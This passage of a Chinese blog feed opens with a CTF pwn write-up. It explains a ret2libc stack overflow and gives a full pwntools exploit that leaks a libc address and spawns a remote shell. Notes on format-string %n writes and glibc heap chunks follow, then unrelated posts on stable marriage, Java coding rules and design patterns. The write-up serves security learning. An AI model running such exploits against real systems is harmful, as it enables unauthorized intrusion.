<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/5585dad554d0ea0d.png" alt=""></p>
<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
<p>因此要找到system函数，知识点(搬运自wiki)</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
</ul>
<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/a7aa7555e20ab191.png" alt=""></p>
<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/13091ab9ec6a827c.png" alt=""></p>
<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
<p>%d:打印成数字，只能泄露栈本身内容</p>
<p>%x:打印成16进制，只能泄露栈本身内容</p>
<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
<p>%c:输出字符</p>
<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
<p>%n:写入4个字节，写入1—&gt;0000 0001</p>
<p>%hn:写入两个字节，写入1—&gt;0001</p>
<p>%hhn:写入单个字节,写入1—&gt;01</p>
<h3 id="堆学习"><a href="#堆学习" class="headerlink" title="堆学习"></a>堆学习</h3><p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。首先堆是由低地址向高地址增长，可读可写的数据结构</p>
<h4 id="堆的相关数据结构"><a href="#堆的相关数据结构" class="headerlink" title="堆的相关数据结构"></a>堆的相关数据结构</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看出在一个chunk中有这样几个数据</p>
<ul>
<li>prev_size: 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
<li>size：该chunk的大小，大小必须是 2 <em> SIZE_SZ 的整数倍。如果申请的内存大小不是 2 </em> SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 <em> SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。<strong>当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。</strong></em>这也方便进行空闲 chunk 之间的合并。</li>
<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
</ul>
<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<p>被释放的chunk被记录在链表中，具体结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h4 id="bin是什么"><a href="#bin是什么" class="headerlink" title="bin是什么"></a>bin是什么</h4><p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
]]></content>
      <categories>
        <category>希踢爱抚!</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>基础</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>stable marriages(稳定婚姻) problem</title>
    <url>/2023/07/19/stable-marriages-%E7%A8%B3%E5%AE%9A%E5%A9%9A%E5%A7%BB-problem/</url>
    <content><![CDATA[<p>稳定婚姻问题，from ubc-vsp23，感觉确实是一个有趣的问题。</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>问题本身：有n个男孩，n个女孩，每一个男孩有他对于所有女孩的排名，每一个女孩也有她对于所有男孩的排名，那么如何将他们配对呢？别tm说什么为什么一定要配对（  图示：</p>
<p><img src="https://s2.loli.net/2023/07/20/csb8jqtRmlIk9Jh.png" alt="稳定婚姻问题.png"></p>
<p>首先既然是稳定婚姻问题，我们得先定义出来什么是稳定，在婚姻问题中我们对稳定的定义是：不存在这样两队夫妻：她们彼此更喜欢另一对的另一半。emmm有点抽象，就是说男一和女一在一起，男二和女二在一起，如果男二和女一相互喜欢，那么这里的婚姻是不稳定的，不能出现这种情况。当然这样定义肯定会出现一个问题，这是第一个问题：<strong>每一个喜好列表的人都能找到稳定的配对吗？</strong>或者说，每一对情侣能找到一个保证稳定不分手的情况吗？这里有一个算法提出了一个解决方案：<strong>Gale-Shapley</strong>算法</p>
<h3 id="Gale-Shapley算法"><a href="#Gale-Shapley算法" class="headerlink" title="Gale-Shapley算法"></a>Gale-Shapley算法</h3><p>算法步骤如下:</p>
<ol>
<li>初始时，所有的男性和女性都被标记为”单身”状态。</li>
<li>从未与女性提出过求婚的男性中，选择一个男性。</li>
<li>对于这个男性，按照他对女性的偏好顺序，从未被求婚过的女性中选择一位女性。</li>
<li>如果这位女性是”单身”状态，则接受男性的求婚，两人形成婚姻配对。</li>
<li>如果这位女性已经与其他男性形成婚姻配对，比较当前男性和已婚男性对女性的偏好，如果当前男性更受女性喜欢，则女性与当前男性解除婚姻关系，接受当前男性的求婚。</li>
<li>如果这位女性拒绝当前男性的求婚，男性继续尝试向下一位女性提出求婚。</li>
<li>重复步骤2-6，直到所有男性都提出过求婚。</li>
</ol>
<p>这确实是一个很有意思的问题，多想想可以多理解一点东西。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>“代码规范”</title>
    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<p> 软件开发代码规范:</p>
<span id="more"></span>
<h1 id="JAVA代码规范"><a href="#JAVA代码规范" class="headerlink" title="JAVA代码规范"></a>JAVA代码规范</h1><h2 id="普通规范"><a href="#普通规范" class="headerlink" title="普通规范"></a>普通规范</h2><h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称"><a href="#包的命名方式：公司域名倒置-子公司-产品名称-功能名称" class="headerlink" title="包的命名方式：公司域名倒置+子公司/产品名称+功能名称"></a>包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4><p>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>
<h4 id="utils和tools命名规范"><a href="#utils和tools命名规范" class="headerlink" title="utils和tools命名规范"></a>utils和tools命名规范</h4><p>utils:</p>
<ul>
<li>定义：通用的，与业务无关，可供其他项目使用</li>
<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
<li>例子：字符串类，文件工具类</li>
</ul>
<p>tools:</p>
<ul>
<li>定义：在当前项目通用；仅能在当前项目使用</li>
<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
<li>用户校验类，支付工具类</li>
</ul>
<h4 id="类名规范"><a href="#类名规范" class="headerlink" title="类名规范"></a>类名规范</h4><p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
<p>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h4><p>成员属性，变量名使用有含义的单词或词组构成；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>
<p>常量必须由大写字母和下划线分割单词的方式组成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>
<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>
<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="方法的命名规范"><a href="#方法的命名规范" class="headerlink" title="方法的命名规范"></a>方法的命名规范</h4><p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="注释规范"><a href="#注释规范" class="headerlink" title="注释规范"></a>注释规范</h2><p>注释：</p>
<ul>
<li>屏蔽不需要执行的代码</li>
<li>对代码进行解释说明</li>
</ul>
<h4 id="类的注释"><a href="#类的注释" class="headerlink" title="类的注释"></a>类的注释</h4><p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="方法的注释"><a href="#方法的注释" class="headerlink" title="方法的注释"></a>方法的注释</h4><p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> </span><br><span class="line">&#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);</span><br><span class="line"> <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="成员属性的注释"><a href="#成员属性的注释" class="headerlink" title="成员属性的注释"></a>成员属性的注释</h4><p>可以使用单行注释也可以使用多行注释</p>
<p>代码块和单行代码通常采用单行注释</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">file.delete(); <span class="comment">//删除文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码格式规范"><a href="#代码格式规范" class="headerlink" title="代码格式规范"></a>代码格式规范</h3><h4 id="统一编码格式"><a href="#统一编码格式" class="headerlink" title="统一编码格式"></a>统一编码格式</h4><p>统一采用UTF-8的格式</p>
<h4 id="编码的缩进"><a href="#编码的缩进" class="headerlink" title="编码的缩进"></a>编码的缩进</h4><p>缩进空格数为4，同一业务级代码块保持左对齐，不能全在同一垂直线上</p>
<h4 id="代码行宽度"><a href="#代码行宽度" class="headerlink" title="代码行宽度"></a>代码行宽度</h4><p>单行代码最长不得超过120列</p>
<h4 id="代码行长度"><a href="#代码行长度" class="headerlink" title="代码行长度"></a>代码行长度</h4><p>方法长度限制在100行内，若有超过可能按照<strong>业务逻辑</strong>拆分成多个方法</p>
<h4 id="属性及方法的范围确定"><a href="#属性及方法的范围确定" class="headerlink" title="属性及方法的范围确定"></a>属性及方法的范围确定</h4><ul>
<li><p>public : 当某个方法或属性需要<strong>被外部非子类和非同包内中的对象直接调用</strong>的时候采用public属性。</p>
</li>
<li><p>protected : 当某个方法或属性<strong>只会被其子类调用</strong>或者<strong>只会同一包下的其他对象调用</strong>时，使用protected限制。</p>
</li>
<li><p>private: 当某个方法或属性<strong>只会被本类中的其他方法调用</strong>的时候，使用private限制。</p>
</li>
</ul>
<h4 id="硬编码的后遗症"><a href="#硬编码的后遗症" class="headerlink" title="硬编码的后遗症"></a>硬编码的后遗症</h4><p>常量字符串或数值必须<strong>在类中定义常量值</strong>，通过<strong>常量值引用</strong>来使用固定数值和固定字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">public static final int MIN_DATA = 1;</span><br><span class="line">public static final int MAX_DATA = 99;</span><br><span class="line">public static final String STR_SUM = &quot;岗位评分结果为=&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void printSum() &#123;</span><br><span class="line">System.out.println(STR_SUM+(MIN_DATA+MAX_DATA));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="TODO规范"><a href="#TODO规范" class="headerlink" title="TODO规范"></a>TODO规范</h4><p>用来描述已知待改进，待补充的修改点，加上作者名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TODO &lt;“作者名称”&gt;: 补充XX处理</span><br></pre></td></tr></table></figure>
<h4 id="方法参数规范"><a href="#方法参数规范" class="headerlink" title="方法参数规范"></a>方法参数规范</h4><p>每个方法最多三个参数，超出三个要封装成javabean对象</p>
<h4 id="SysLog日志注解使用"><a href="#SysLog日志注解使用" class="headerlink" title="@SysLog日志注解使用"></a>@SysLog日志注解使用</h4><p>接口涉及增删改数据时必须使用@SysLog注解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;权限配置-修改用户角色&quot;,notes = &quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@SysLog(&quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/editUserRole&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title function_">saveUserRole</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO userDTO)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(userDTO.getUserId() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> R.failed(Boolean.FALSE).setMsg(<span class="string">&quot;用户id不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R.ok(userService.saveUserRole(userDTO));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="工程框架规范"><a href="#工程框架规范" class="headerlink" title="工程框架规范"></a>工程框架规范</h3><h4 id="应用分层"><a href="#应用分层" class="headerlink" title="应用分层"></a>应用分层</h4><p>代码分层为MVC方式，<strong>不能</strong>用DDD方式修改代码目录结构</p>
<h4 id="依赖包管理版本规范"><a href="#依赖包管理版本规范" class="headerlink" title="依赖包管理版本规范"></a>依赖包管理版本规范</h4><p>基础平台父工程hdp已经引入绝大部分开发所需maven 依赖包，如果需要增加依赖包必须先征得架构师同意。业务项目<strong>不得重复添加已有依赖包</strong>，所添加依赖包版本必须<strong>与基础平台依赖包版本一致</strong>，引入后必须<strong>处理依赖冲突</strong>。</p>
]]></content>
      <categories>
        <category>语言规范</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>常用规范</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索平台开发知识点整合</title>
    <url>/2024/09/23/%E5%85%B3%E4%BA%8E%E5%BC%80%E5%8F%91%E6%90%9C%E7%B4%A2%E4%B8%AD%E5%8F%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<p> 这是在开发搜索中台中涉及到的一些比较新颖的技术或者知识点或者设计思想，整合了一下思路和一些代码，方便日后的开发和复用</p>
<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>设计模式就是一种设计思想，重点在于怎么设计而不是代码，项目中包含三个设计模式：门面模式，适配器模式，注册器模式。</p>
<h3 id="门面模式"><a href="#门面模式" class="headerlink" title="门面模式"></a>门面模式</h3><p>门面就是指一个统一的一个入口，也就是说<strong>前端只需要发送请求，不需要关心门面背后的具体细节</strong>。就好像用户去酒店订房间，酒店前台应该干的事情一样，比如用户需要同时定三个房间，这三个房间就直接让前台做好就行，不需要用户自己一间一间去完成。程序设计同理，假如前端需要三个方向的数据，比如同时请求了用户信息，文章信息和图片信息，可以抽象出一个接口，同时返回这三个信息，这样就不需要同时调用三个接口了。</p>
<h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><p>适配器模式指定制统一的数据源接入规范，比如：</p>
<ol>
<li>什么类型的数据源允许接入？</li>
<li>接入数据源时需要满足的要求？</li>
<li>接入时需要做出什么调整？</li>
</ol>
<p>只要数据源符合了规范，那么它就可以被接入系统当中，假如原有的数据源已经做好了搜索等接口，但是和规范的数据源搜索接口不一致，有参数上的区别，那么通过适配器模式可以将两个接口对接成新的统一的接口，就好像转接插头那样。</p>
